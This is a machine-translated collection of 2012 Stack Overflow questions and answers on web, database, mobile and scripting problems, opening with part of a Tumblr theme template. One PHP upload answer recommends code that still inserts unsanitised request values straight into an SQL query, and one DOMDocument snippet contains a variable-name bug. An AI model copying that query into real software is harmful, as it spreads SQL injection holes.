                {block:Lines}<li>{block:Label}<strong>{Label}</strong> {/block:Label}{Line}</li>{/block:Lines}
            </ul>
        {/block:Chat}
        {block:Answer}
            <div class="quote">
                {Question}
                <div class="arrow"></div>
            </div>
            <p style="margin-left: 20px"><img style="margin: 0 3px -3px 0" src="{AskerPortraitURL-16}" /> {Asker}</p>
            {Answer}
        {/block:Answer}
        {block:Photoset}
        {block:IndexPage}
            {Photoset-250}
        {/block:IndexPage}
        {block:PermalinkPage}
            <div class="media">
                {Photoset-500}
                {block:Caption}{Caption}{/block:Caption}
            </div>
        {/block:PermalinkPage}
        {/block:Photoset}
        {block:Video}
        {block:IndexPage}
            {Video-250}
        {/block:IndexPage}
        {block:PermalinkPage}
            <div class="media">
                {Video-500}
                {block:Caption}{Caption}{/block:Caption}
            </div>
        {/block:PermalinkPage}
        {/block:Video}

        {PostNotes}
    </div>

    {/block:Posts}
</div>

{block:IndexPage}
<script type="text/javascript">
$(function(){var $container = $('.posts').css({ opacity: 0 });$container.imagesLoaded(function(){$container.animate({ opacity: 1 });$container.masonry({itemSelector:'.post',columnWidth: 300});});{block:IfInfiniteScroll}
$container.infinitescroll({navSelector:'#pagination',nextSelector:'#pagination a#next',itemSelector: '.post',loading: {img:'http://static.tumblr.com/jw8fmba/D6Pluysct/loading.gif',donetext:''}},function( newElements ) { var $newElems = $( newElements ).css({ opacity: 0 });$newElems.imagesLoaded(function(){$newElems.animate({ opacity: 1 });$container.masonry( 'appended', $newElems, true );});});{/block:IfInfiniteScroll}});
</script>
{/block:IndexPage}

</body>
</html> 
```

这是网站 www.hexabee.tumblr.com

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:40:03.227

您可以使用 CSS 来偏移行并定位它们以使它们重叠。

HTML：

```
<div>
    <img src="hex.png"/>
    <img src="hex.png"/>
    <img src="hex.png"/>
</div>
<div class="alt">
    <img src="hex.png"/>
    <img src="hex.png"/>
    <img src="hex.png"/>
    <img src="hex.png"/>
</div>
<div>
    <img src="hex.png"/>
    <img src="hex.png"/>
    <img src="hex.png"/>
</div> 
```

CSS：

```
div{
    /*negative bottom margin to move following rows up*/          
}
div.alt{
    position:relative;
    /*use a negative left value to offset the alternate rows*/
} 
```

现场演示：[六边形布局](http://jsfiddle.net/jesseflorig/QBFfa/)

虽然它不是最优雅的解决方案，但它应该能让你到达你想要的地方。

# node.js - Mongoose：一系列自定义实例

> ID：13841169
> 
> 赞同：1
> 
> 时间：2012-12-12T13:44:46.830
> 
> 标签：node.js, mongodb, mongoose

根据文档，我可以做这样的事情：

```
var animalSchema = new Schema({ name: String, type: String });

animalSchema.methods.findSimilarTypes = function (cb) {
  return this.model('Animal').find({ type: this.type }, cb);
} 
```

假设我有另一个功能：

`animalSchema.methods.owner`which filter if `animalScheme.owner`is xyz，所以它将搜索查询修改为`{..., owner: xyz}`

是否可以按顺序使用实例？我怎样才能做到这一点？

```
var animalSchema.findSimilarTypes().owner("xyz") ? 
```

任何提示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-14T17:32:32.820

我相信这不会立即起作用，因为原始函数`findSimilarTypes`不返回模式对象。

我猜你正在尝试对 jQuery 的工作方式做一些事情。

# access-token - 获得一个新的短期用户 access_token

> ID：13841174
> 
> 赞同：1
> 
> 时间：2012-12-12T13:44:56.797
> 
> 标签：access-token, facebook-access-token

我需要更新一个长期有效的访问令牌。我阅读了 [更新长寿命访问令牌服务器端](http://facebook.stackoverflow.com/questions/10651070/renew-long-lived-access-token-server-side)主题并编写了如下代码：

```
<?php

$code = $_REQUEST["code"];

if(empty($code)) {

  $dialog_url = "https://www.facebook.com/dialog/oauth?"
    . "client_id=$app_id"
    . "&redirect_uri=$my_url"
    . "&scope=..."
    ;

  echo("<script> top.location.href='" . $dialog_url . "'</script>");
}
else
{
  $response = file_get_contents("https://graph.facebook.com/oauth/access_token?"
    . "client_id=$app_id"
    . "&redirect_uri=$my_url"
    . "&client_secret=$app_secret"
    . "&code=$code"
    );

  $params = null;
  parse_str($response, $params);
  $access_token=$params['access_token'];

  $response = file_get_contents("https://graph.facebook.com/oauth/access_token?"
    . "client_id=$app_id"
    . "&client_secret=$app_secret"
    . "&redirect_uri=$my_url"
    . "&grant_type=fb_exchange_token"
    . "&fb_exchange_token=$access_token"
    );
}

?> 
```

在第一次调用时，它会获得 60 天的访问令牌。我希望在下一次调用中它会获得另一个（可能具有相同名称）60 天令牌，并且我会在调试器[https://developers.facebook.com/tools/debug](https://developers.facebook.com/tools/debug)中看到发布时间和到期时间变化，但时代不变。我的场景有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-29T15:13:52.243

您是否将令牌相互比较？在不到 24 小时内拨打相同电话时，Facebook 将向您发回现有的访问令牌。此外，如果您还为用户请求了页面令牌，则令牌设置为不过期。在此处查看我的答案：[Facebook 页面访问令牌 - 这些会过期吗？](https://stackoverflow.com/questions/7696372/facebook-page-access-tokens-do-these-expire/14585405#14585405)有关此主题的更多信息。

您可以确保每次都获得新令牌的一种方法是，如果您通过对 /PROFILE_ID/permissions 进行 http DELETE 调用然后请求新令牌来撤销访问权限。唯一不好的是它需要您再次让用户通过 oAuth 对话框。

# http - 从 HTTP://{site name} 重定向到 HHTP://{site name}

> ID：13841176
> 
> 赞同：0
> 
> 时间：2012-12-12T13:44:59.993
> 
> 标签：http, web

谁知道，什么是 HHTP，什么时候出现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:58:14.953

HHTP 不是我所知道的协议，如果您看到一个网站将您从 HTTP 重定向到 HHTP，那么（假设未加载 HHTP 版本）这可能是重定向中的错误。

# php - 如何从 PHP 中的 HTML 文件的所有标签中删除所有 'alt' 属性？

> ID：13841179
> 
> 赞同：-4
> 
> 时间：2012-12-12T13:45:01.067
> 
> 标签：php, image, alt

> **可能重复：**
> [从 HTML 标记中删除样式属性](https://stackoverflow.com/questions/5517255/remove-style-attribute-from-html-tags)

当前图像看起来像

```
<img src="images/sample.jpg" alt="xyz"/> 
```

现在我想删除 HTML 文件中所有标签中存在的所有此类 alt 标签，PHP 代码本身应该替换所有 alt 属性外观。输出应该 `<img src="images/sample.jpg" />`只是 php 怎么办？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:58:35.480

首先，您需要保留要修改的文档源。目前尚不清楚您是否要编辑服务器上的一些 html 文件、编辑请求生成的 html 输出或什么...

在这个答案中，我将介绍如何访问 HTML。它可能是一个`file_get_contents('filename.html');`或[一些输出缓冲的魔法](http://php.net/manual/en/function.ob-start.php)。

由于[您不想使用正则表达式解析 HTML，因此](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags)您需要使用解析器：

由于该`alt`属性是 HTML 有效所必需的，因此如果要“删除”它，则必须将其设置为空字符串。

这应该有效：

```
$doc = DOMDocument::loadHTML($myhtml);
$images = $doc->getElementsByTagName('img'); 

foreach($images as $img) {
    $image->setAttribute('alt', '');
}

$myhtml = $doc->saveHTML(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T13:53:49.610

用于[`DOMDocument`](http://uk3.php.net/manual/en/class.domdocument.php)HTML 解析/操作。下面的示例读取一个 HTML 文件，`alt`从所有标签中删除属性`img`，然后打印出 HTML。

```
$dom = new DOMDocument();
$dom->loadHTMLFile('file.html');

foreach($dom->getElementsByTagName('img') as $image)
{
    $image->removeAttribute('alt');
}

echo $dom->saveHTML(); // print the modified HTML 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T13:49:59.270

阅读您的文件。您可以使用 file_get_contents() 来读取文件

```
$fileContent = file_get_contents('filename.html');
$fileContent = preg_replace('/alt=\"(.*)\"/', '', $fileContent);
file_put_contents('filename.html', $fileContent); 
```

确保您的文件是可写的

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T13:53:19.547

对于有效的 xHTML，它应该具有 alt 属性。

像这样的东西会起作用：

```
$xml = new SimpleXMLElement($doc);   // $doc is the html document.
foreach ($xml->xpath('//img') as $img_tag) {
    if (isset($img_tag->attributes()->alt)) {
        unset($img_tag->attributes()->alt);
    }
}
$new_doc = $xml->asXML(); 
```

# ruby-on-rails - 在 Rails 中从 html 文档生成 PDF

> ID：13841181
> 
> 赞同：1
> 
> 时间：2012-12-12T13:45:10.297
> 
> 标签：ruby-on-rails, rubygems

任何人都知道rails中的一些gem或应用程序可以通过一些客户端编程从html5和css3创建pdf文档？

谢谢 ;）

谢谢你的回复。我需要一个可能的项目，该项目将使用 jquery 进行框定位，然后将生成的 html 导出为 pdf。粗略地说，¿这可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T15:53:52.903

根据 Raphael 和 jcadam 的建议，用于客户端生成的 PDFKit 和 WickedPDF

使用 JRuby 的飞碟：http: [//xhtmlrenderer.java.net](http://xhtmlrenderer.java.net)

就个人而言，我通过使用 Prawn PDF 生成器获得了更多成就。恕我直言，它的功能要广泛得多。

用于 Ruby PDF 生成的虾：[https ://github.com/prawnpdf/prawn](https://github.com/prawnpdf/prawn)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:00:28.050

WickedPDF：[https ://github.com/mileszs/wicked_pdf](https://github.com/mileszs/wicked_pdf)

我现在正在使用它并且很喜欢它：

> “Wicked PDF 使用 shell 实用程序 wkhtmltopdf 从 HTML 向用户提供 PDF 文件。换句话说，与其处理某种 PDF 生成 DSL，您只需像往常一样编写 HTML 视图，然后让 Wicked照顾硬的东西。”

如果您需要更多控制，还可以查看 Prawn：[https](https://github.com/prawnpdf/prawn) ://github.com/prawnpdf/prawn 。虽然 Prawn 不是 HTML -> PDF 转换器，但对于从头开始创建 PDF 更有用。

我在当前项目中同时使用了 Prawn 和 WickedPDF：WickedPDF 生成网页的“可打印”版本，Prawn 生成详细的 PDF 报告。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T13:53:52.030

我相信 PDFKit gem 可能是您正在寻找的。 [https://github.com/pdfkit/PDFKit](https://github.com/pdfkit/PDFKit)

如果您想要图像而不是 PDF，还有 IMGKit。 [https://github.com/csquared/IMGKit](https://github.com/csquared/IMGKit)

# sql-server - 在 SQL Server Express 2005 中自动重建索引

> ID：13841185
> 
> 赞同：1
> 
> 时间：2012-12-12T13:45:19.200
> 
> 标签：sql-server, tsql, indexing, sql-server-2005-express

我的团队正在开发一个 .NET Web 应用程序，其数据存储通过 SQL Server 2005 Express 进行管理。是否可以自动化数据库中的任务，以便在部署/安装后的某个时间间隔内自动重建某些索引？如果是这样，这是如何实现的？我以为它会在`tasks`数据库下，但我没有看到它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T06:08:33.567

当我为我的数据库提供服务时，这个脚本可以帮助我消除索引的碎片。也许，它对您有用：

```
SET NOCOUNT ON;

DECLARE 
      @SQL NVARCHAR(MAX)
    , @IndexName SYSNAME
    , @Output VARCHAR(200)
    , @ServerVersion VARCHAR(100)

SELECT @ServerVersion = CAST(SERVERPROPERTY('Edition') AS VARCHAR(100))

DECLARE cur CURSOR LOCAL READ_ONLY FORWARD_ONLY FOR
    SELECT
        'ALTER INDEX [' + ix.name + N'] ON [' + SCHEMA_NAME(t.[schema_id]) + '].[' + t.name + '] ' + 
        CASE
            WHEN ps.avg_fragmentation_in_percent > 50 THEN
                CASE WHEN @ServerVersion LIKE 'Enterprise%' OR @ServerVersion LIKE 'Developer%' THEN
                  'REBUILD WITH (SORT_IN_TEMPDB = ON, ONLINE = ON ' + CASE WHEN ix.fill_factor > 0 THEN ', FILLFACTOR = ' + CAST(ix.fill_factor AS VARCHAR(3)) ELSE '' END + ') '
                ELSE
                  'REBUILD WITH (SORT_IN_TEMPDB = ON' + CASE WHEN ix.fill_factor > 0 THEN ', FILLFACTOR = ' + CAST(ix.fill_factor AS VARCHAR(3)) ELSE '' END + ') '
            END
            ELSE 'REORGANIZE ' 
        END + 
        CASE
            WHEN ps.partition_number > 1 THEN N' PARTITION = ' + CAST(ps.partition_number AS NVARCHAR(MAX))
            ELSE N''
        END + ';', ix.name
    FROM sys.indexes ix
    JOIN sys.objects t ON t.[object_id] = ix.[object_id]
    JOIN (
        SELECT 
              [object_id]
            , index_id
            , avg_fragmentation_in_percent
            , partition_number
        FROM sys.dm_db_index_physical_stats(DB_ID(), NULL, NULL, NULL, N'LIMITED')
        WHERE page_count > 100
            AND avg_fragmentation_in_percent > 10
    ) ps ON t.[object_id] = ps.[object_id] AND ix.index_id = ps.index_id

OPEN cur

FETCH NEXT FROM cur INTO @SQL, @IndexName

WHILE @@FETCH_STATUS = 0 BEGIN

    SELECT @Output = CONVERT(NVARCHAR(15), GETDATE(), 114) + ': ' + @IndexName
    RAISERROR(@Output, 0, 1) WITH NOWAIT

    EXEC (@SQL)

    FETCH NEXT FROM cur INTO @SQL, @IndexName

END 

CLOSE cur 
DEALLOCATE cur 
```

# objective-c - 如何使用捏缩放（UIPinchGestureRecognizer）来改变 UIView 的宽度

> ID：13841195
> 
> 赞同：2
> 
> 时间：2012-12-12T13:46:10.293
> 
> 标签：objective-c, ios, uipinchgesturerecognizer

我可以让`UIPinchGestureRecognizer`处理程序使用缩放对象，但我不想缩放我想更改大小。例如，我有一个`UIView`并且我已经攻击了一个`UIPinchGestureRecognizer`手势，如果用户捏我想改变宽度`UIView`以匹配捏。我不想缩放它所以`UIView`更大（缩放）

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-12-12T14:13:46.437

如果你有 UIPinchGestureRecognizer 调用方法 pinch，你可以这样做：

```
- (void) pinch:(UIPinchGestureRecognizer *)pinch
{
    CGRect frame = [self.view frame];
    frame.size.width = frame.size.width * pinch.scale;
    [self.view setFrame:frame];
} 
```

# playframework-2.0 - PlayFramework 中 Ebean 模型的属性更改时通知？

> ID：13841196
> 
> 赞同：1
> 
> 时间：2012-12-12T13:46:11.557
> 
> 标签：playframework-2.0, listener, ebean

我想在历史模型中添加对特定模型发生的所有更改事件，为此，这就是我所做的：

```
class MyModel extends Model {
    @Id
    private Long Id;

    private String name;

    public Long getId() {
    return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        History.add(this.getId(), "name", this.name, name);
        this.name = name;
    }
}

public class History extends Model {
    public Long beanId;
    public String field;
    public String oldValue;
    public String newValue;

    public static void add (Long beanId, String field, String oldValue, String newValue) {
        History history = new History();
        history.beanId = beanId;
        history.field = field;
        history.oldValue = oldValue;
        history.newValue = newValue;
        history.save();
    }
} 
```

除了没有保存 beanId 之外，一切都会正常工作。原因对我来说很清楚，但正因为如此，我被困住了。

原因 ？这是因为我通过控制器中的 Form 设置了这些值（在更新方法中）：

```
Form<MyModel> form = form(MyModel.class).bindFromRequest();
MyModel model = form.get(); 
```

通过这样做，`bindFromRequest()`在 MyModel 中设置值而不设置 id（当然），因此`this.getId()`为 null。

我该怎么做才能拥有`getId()`模型的相应ID？

（注意：我简化了问题，删除了创建、检查等）。

# excel - Excel：检测 OLE 自动化？

> ID：13841198
> 
> 赞同：1
> 
> 时间：2012-12-12T13:46:22.493
> 
> 标签：excel, ole

我们有一个第三方程序，它使用 OLE 将数据写入 Excel。不幸的是，该应用程序的程序员不了解使 excel 不可见和隐藏更新极大地加速了 excel。目前，大型作业最多需要 15 分钟才能完成，这很烦人。因此，我想编写一个插件，当程序写入 excel 时，它会关闭可见性等。有没有办法做到这一点？它是唯一使用这种技术的应用程序，因此检测 COM / OLE 交互就足够了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T23:40:29.497

而是让 excel 检查它是否在 OLE 自动化手中，可以检查窗口中运行 OLE 的进程的名称

就像是

```
Function isRunning(ProcessName) As Boolean

Dim objWMIcimv2 As Object
Dim objList As Object

Set objWMIcimv2 = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\.\root\cimv2") 'Connect to CIMV2 Namespace

Set objList = objWMIcimv2.ExecQuery _
("select * from win32_process where name='" & ProcessName & "'")

If objList.Count > 0 Then

  isRunning = True

End If
End Function 
```

从那里你可以很容易地抑制屏幕更新。我猜测第三方应用程序通常不会在用户桌面上闲置运行。如果确实如此，那么显然这种方法对您没有帮助。

[受此链接](http://www.vbaexpress.com/kb/getarticle.php?kb_id=811%20link)启发的关于终止程序的代码

# php - 复制（）的问题

> ID：13841199
> 
> 赞同：0
> 
> 时间：2012-12-12T13:46:27.750
> 
> 标签：php

我不是一个PHPer，但我正在查看一个客户非常旧的网站，因为他遇到了一些错误。这是一个古老的定制 CMS，可以追溯到 2007 年 2 月。

尝试上传图片时出现错误：

> 警告：copy() [function.copy]：无法在 blah/blah/blah 中访问

这是有问题的代码的一部分：

```
$path= "images/".$new_file_name;

if($ufile !=none)
{
    if(copy($HTTP_POST_FILES['ufile']['tmp_name'], $path))
    {
        echo "<h1>uploading...</h1>";

        $img_name = $_POST['name'];

        mysql_query("UPDATE properties SET img_main='$Xnew_file_name_small',img_main_name='$img_name'  WHERE ref='$ref'");

        $small_image=imagecreatefromjpeg('images/'.$new_file_name);

        imagejpeg($small_image, 'images/'.$new_file_name_small, 50);

        unlink('images/'.$new_file_name);

        echo("<meta http-equiv='refresh' content='0;URL=upload_scipt_main_2.php?ref=". $ref."&img=".$new_file_name_small." '/>");
    }
    else
    {
        echo "Error";
    }
} 
```

我想知道的是，这是否意味着复制功能对其尝试写入的路径没有写入权限。另外，由于网站太旧了，这个错误会不会是由于 PHP 版本正在升级引起的？现在是 5.3.14。

我意识到这可能是在黑暗中拍摄，可能有很多原因导致它不起作用，并且发布的代码位没有太大帮助，但任何指导都会非常有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:52:10.053

由于您的问题中包含的错误消息相当神秘，即`blah/blah/blah`，我无法判断它是应用于上传的文件还是目标。如果错误与目的地有关，则意味着`images/`您的 Web 服务器（例如 Apache）无法写入该目录。将文件夹的权限更新为可写可能足以解决问题。

另一方面，如果错误是关于上传的文件，我将不得不同意你的说法，即错误*可能*是由于 PHP 版本升级引起的。

根据文档，[`$HTTP_POST_FILES`](http://php.net/manual/en/reserved.variables.files.php)已经弃用了一段时间，取而代之的是 new(ish) `$_FILES`。

在同一主题上，您似乎使用此代码基本上是“上传文件”。考虑到这一点，您将不想使用`copy()`but [`move_uploaded_file()`](http://php.net/move_uploaded_file)。

所以，而不是像这样的一行：

```
copy($HTTP_POST_FILES['ufile']['tmp_name'], $path) 
```

你会想尝试：

```
move_uploaded_file($_FILES['ufile']['tmp_name'], $path) 
```

尽管您可能在其他地方拥有它，但您还应该验证文件是否已上传；你可以用[`is_uploaded_file()`](http://php.net/manual/en/function.is-uploaded-file.php). 结合上述内容和您的示例代码，以下内容应该是您的目标：

```
if(is_uploaded_file($_FILES['ufile']['tmp_name'])) {
    $path= "images/".$new_file_name;
    if(move_uploaded_file($_FILES['ufile']['tmp_name'], $path)) {
        echo "<h1>uploading...</h1>";

        $img_name = $_POST['name'];

        mysql_query("UPDATE properties SET img_main='$Xnew_file_name_small',img_main_name='$img_name'  WHERE ref='$ref'");

        $small_image=imagecreatefromjpeg('images/'.$new_file_name);

        imagejpeg($small_image, 'images/'.$new_file_name_small, 50);

        unlink('images/'.$new_file_name);

        echo("<meta http-equiv='refresh' content='0;URL=upload_scipt_main_2.php?ref=". $ref."&img=".$new_file_name_small." '/>");
    } else {
        echo "Error: The file could not be moved.";
    }
} else {
    echo "Error: The file could not be uploaded.";
} 
```

# ruby - 使用 Ruby 设置（无法加载此类文件 json/pure）

> ID：13841200
> 
> 赞同：11
> 
> 时间：2012-12-12T13:46:27.873
> 
> 标签：ruby

嗨，我正在研究 API [https://developers.supportbee.com/platform/overview](https://developers.supportbee.com/platform/overview)

在做 的时候`bin/sbapp new APP_SLUG` 我得到了错误

```
/home/nitesh/.gem/ruby/1.9.1/gems/bundler-1.2.3/lib/bundler/spec_set.rb:90:in `block in materialize': Could not find multi_json-1.3.6 in any of the sources (Bundler::GemNotFound) 
```

之后我再次尝试 `gem install multi_json` ，然后再次得到错误

```
Successfully installed multi_json-1.5.0
/usr/local/share/ruby/site_ruby/rubygems/core_ext/kernel_require.rb:45:in `require': cannot load such file -- json/pure (LoadError) 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-12-18T07:36:57.103

安装导轨时出现此错误。我通过运行`gem install json_pure` 然后`gem install rails`再次运行来解决它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-13T10:24:09.457

我正在使用加入 1.7.7 并且有相同的错误，所以我通过将 json 更新到版本 1.8.1 来修复：

```
vim Gemfile 
```

将 json 版本编辑为“1.8.1”

```
gem install bundler
bundle install 
```

和这项工作！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T16:09:16.750

你应该尝试做一个

```
bundle install 
```

首先然后运行为

```
bundle exec bin/sbapp new APP_SLUG 
```

# pdf - 经典的 ASP/asppdf 组件和页码

> ID：13841205
> 
> 赞同：2
> 
> 时间：2012-12-12T13:46:48.857
> 
> 标签：pdf, asp-classic

有没有人有通过经典 ASP 中的 asppdf 组件进行动态页码编号的经验，谢谢 似乎无法在对象参考或手册中找到它

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T10:02:31.273

抱歉，这是一个非常简单的解决方案，我所要做的就是一个正常的计数循环并在 pdf 中绘制一个具有此值的画布......有时事情看起来比实际更难......

下面你会找到我的解决方案：

```
Set Pdf = Server.CreateObject("Persits.PDF")
    Set Doc = Pdf.CreateDocument
    Doc.ImportFromUrl "http://www.mydomain.com/assets/incs/path/script.asp"

    For Each Page in Doc.Pages
        str = "Page " & Page.Index & " of " & Doc.Pages.Count
        Page.Canvas.DrawText str, "x=10, y=20", Doc.Fonts("Courier")
    Next

    Doc.Save "c:\mypath\filename.pdf", False 
Set Pdf = Nothing 
```

# python - 提供 Python 脚本的 Web 服务器

> ID：13841206
> 
> 赞同：1
> 
> 时间：2012-12-12T13:46:49.450
> 
> 标签：python, apache, mod-wsgi

我有一个我想从浏览器运行的 Python 脚本，似乎 mod_wsgi 是要走的路，但该方法感觉太重了，需要修改脚本以输出。我想我想要一种理想的 php 方法。这些脚本不接受任何输入，只能在内部网络上访问。

我在已经设置了 mod_wsgi 的 Linux 上运行 apache，这里有哪些选项？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T13:56:13.780

您可以使用任何 python 的微框架从服务器快速运行您的脚本。大多数包括他们自己的轻量级服务器。

来自[cherrypy](http://www.cherrypy.org/)主页文档

```
import cherrypy
class HelloWorld(object):
    def index(self):
        # run your script here
        return "Hello World!"
    index.exposed = True

cherrypy.quickstart(HelloWorld()) 
```

另外，python 提供了使用[HttpServer在其标准库中执行所需操作所需的工具](http://docs.python.org/2/library/basehttpserver.html)

使用[BaseHttpServer](http://wiki.python.org/moin/BaseHttpServer)的基本服务器：

```
import time
import BaseHTTPServer

HOST_NAME = 'example.net' # !!!REMEMBER TO CHANGE THIS!!!
PORT_NUMBER = 80 # Maybe set this to 9000.

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_HEAD(s):
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
    def do_GET(s):
        """Respond to a GET request."""
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write("<html><head><title>Title goes here.</title></head>")
        s.wfile.write("<body><p>This is a test.</p>")
        # If someone went to "http://something.somewhere.net/foo/bar/",
        # then s.path equals "/foo/bar/".
        s.wfile.write("<p>You accessed path: %s</p>" % s.path)
        s.wfile.write("</body></html>")

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    print time.asctime(), "Server Starts - %s:%s" % (HOST_NAME, PORT_NUMBER)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print time.asctime(), "Server Stops - %s:%s" % (HOST_NAME, PORT_NUMBER) 
```

微框架的好处是它们抽象出编写标题等（但如果需要，仍应为您提供一个接口）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T14:30:45.137

我会采用微框架方法以防万一您的需求发生变化-您永远不知道，它最终可能成为一个应用程序，而只是一个基本的转储......也许最简单的（和老式的方式！？）是使用 CGI：

*   复制您的脚本并`print 'Content-Type: text/plain\n'`在任何其他输出之前包含`sys.stdout`
*   将该脚本放在apache2可以访问的地方（例如您的cgi-bin）
*   确保脚本是可执行的
*   确保`.py`已添加到 Apache CGI 处理程序

但是 - 我不认为这将是一个了不起的优势（至少从长远来看）

# asp.net-mvc - HttpContext.Current.Request.LogonUserIdentity.Groups 返回不同的结果

> ID：13841207
> 
> 赞同：3
> 
> 时间：2012-12-12T13:46:52.750
> 
> 标签：asp.net-mvc, active-directory, authorization, authorize-attribute

我正在尝试使用 Windows 身份验证在我的 MVC Intranet 应用程序中的特定控制器上使用 MVC Authorize 属性。IIS 7.5 设置为仅使用 Windows 身份验证，并且在 web.config 中禁用匿名访问。我通过了域的身份验证，但是，当对控制器执行任何操作时，我仍然会收到输入凭据的提示。我检查了我的浏览器设置 (IE9)，它被设置为使用我当前的 Windows 凭据自动登录。

我试图创建一个自定义的 Authorize Attribute 类来查看发生了什么。在 AuthorizeCore 中，我使用 httpContext 检查了我的用户名和组成员身份。我发现我所属的 System.Web.HttpContext.Current.Request.LogonUserIdentity.Groups 中缺少一个组。一旦 authorizecore 返回 false 并出现凭据提示，我将提供与我当前登录的凭据相同的凭据，然后 AuthorizeCore 再次运行。这一次，找到了所有适当的组，基础 AuthorizeCore 当然授权用户并且一切正常。这是我创建的自定义授权类

```
public class MyAuthorize : AuthorizeAttribute
{
    protected override bool AuthorizeCore(HttpContextBase httpContext)
    {
        bool chk = httpContext.User.IsInRole("mydomain\\heavyequipadmin");

        // this is just to see what AD groups are provided for the current user   
        ArrayList groups = new ArrayList();
        foreach (System.Security.Principal.IdentityReference group in System.Web.HttpContext.Current.Request.LogonUserIdentity.Groups)
        {
            groups.Add(group.Translate(typeof(System.Security.Principal.NTAccount)).ToString());
        }

        // just run the base method to Authorize 
        return base.AuthorizeCore(httpContext);
    }
} 
```

我整个控制器的属性是：

```
[MyAuthorize(Roles = "mydomain\\HeavyEquipAdmin")] 
```

另一件事，web.config 中的角色管理器是：

```
 <roleManager defaultProvider="AspNetWindowsTokenRoleProvider" /> 
```

关于这应该如何工作，我有什么不明白的吗？我只是希望我的身份验证/授权由 AD 处理。我是 MVC 的新手，并且诚实地配置了任何身份验证/授权方案。我确实下载了 MVC 3 的源代码来查看 AuthorizeAttribute 类的代码，看看是否有对我有意义的东西。任何建议在这里将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T08:28:48.287

匿名用户在这里扮演一个角色：如果我们允许在 IIS 上匿名用户，则 System.Web.HttpContext.Current.Request.LogonUserIdentity.Name 将在 IIS 中配置为匿名用户。否则它需要当前登录的用户。

# java - java 正则表达式匹配以特定字符串开头的每个组

> ID：13841209
> 
> 赞同：5
> 
> 时间：2012-12-12T13:46:53.270
> 
> 标签：java, regex

我有一个像`a1wwa1xxa1yya1zz`.

我想让每个组从 a1 开始直到下一个 a1 被排除。（在我的例子中，我会是 : `a1ww`, `a1xx`, `a1yy`and`a1zz`

如果我使用：

```
Matcher m = Pattern.compile("(a1.*?)a1").matcher("a1wwa1xxa1yya1zz");
while(m.find()) {
  String myGroup = m.group(1);
} 
```

`myGroup`每两组抓1组。
所以在我的例子中，我只能捕获`a1ww`和`a1yy`.

有人有好主意吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T14:02:05.863

拆分是一个很好的解决方案，但如果你想留在正则表达式世界，这里有一个解决方案：

```
Matcher m = Pattern.compile("(a1.*?)(?=a1|$)").matcher("a1wwa1xxa1yya1zz");
while (m.find()) {
  String myGroup = m.group(1);
  System.out.println("> " + myGroup);
} 
```

我使用了积极的前瞻来确保捕获之后是`a1`，或者是行尾。

前瞻是零宽度断言，即。他们验证条件而不推进匹配光标，因此他们验证的字符串仍可用于进一步测试。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T13:50:00.393

您可以使用`split()`方法，然后将“a1”作为前缀附加到拆分元素：

```
String str = "a1wwa1xxa1yya1zz";
String[] parts = str.split("a1");
String[] output = new String[parts.length - 1];

for (int i = 0; i < output.length; i++)
    output[i] = "a1" + parts[i + 1];

for (String p : output)
    System.out.println(p); 
```

**输出：**

```
a1ww
a1xx
a1yy
a1zz 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T13:54:19.890

我会使用这样的方法：

```
 String str = "a1wwa1xxa1yya1zz";
    String[] parts = str.split("a1");
    for (int i = 1; i < parts.length; i++) {
        String found = "a1" + parts[i];
    } 
```

# c# - 在 REST Web 服务的情况下，DLL 中存在的静态构造函数不会被调用

> ID：13841212
> 
> 赞同：0
> 
> 时间：2012-12-12T13:46:58.317
> 
> 标签：c#, asp.net, web-services

我有工作的网络服务。我不得不使用相同的代码并开发 REST Web 服务。我已经做了。当我调试它时，我发现了一件不寻常的事情。`RESTWebService`调试项目时不会调用静态构造函数。

所有业务逻辑都在一个 DLL 中。`WebService`和项目都`RESTWebService`使用此 DLL。以下是 DLL 中存在的那些静态构造函数。这些构造函数初始化一些静态值。

```
//Logger.cs
static Logger()
{
    try
    {
        m_LogLevel = ....;
        m_LogFilePath = ....;
    }
    catch
    {
        throw;
    }
}

//Common.cs
static Common()
{
    ERROR_CODES = ....;
    DB_CONNECTION_STRING = ....;
    DB_NOTIFICATION_CONNECTION_STRING = ....;
    DATA_PROVIDER_INVARIANT_NAME = ....;
} 
```

